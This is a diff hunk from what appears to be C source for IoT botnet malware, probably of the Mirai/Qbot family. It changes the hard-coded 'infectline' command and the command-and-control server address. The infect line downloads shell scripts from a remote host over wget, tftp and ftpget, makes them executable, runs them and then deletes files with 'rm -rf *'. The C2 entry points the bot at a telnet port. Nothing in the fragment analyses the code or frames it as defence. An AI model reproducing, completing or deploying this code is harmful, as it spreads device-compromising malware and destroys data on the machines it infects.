@@ -32,13 +32,13 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 
-char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 35.227.127.210/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 35.227.127.210 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 35.227.127.210; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 35.227.127.210 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n";
+char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 10.142.0.2/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 10.142.0.2 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 10.142.0.2; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 10.142.0.2 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n";
 
 // WGET LINE GOES HERE ^
 
 unsigned char *commServer[] =
 {
-        "35.227.127.210:23"
+        "10.142.0.2:23"
 };
 
 int initConnection();
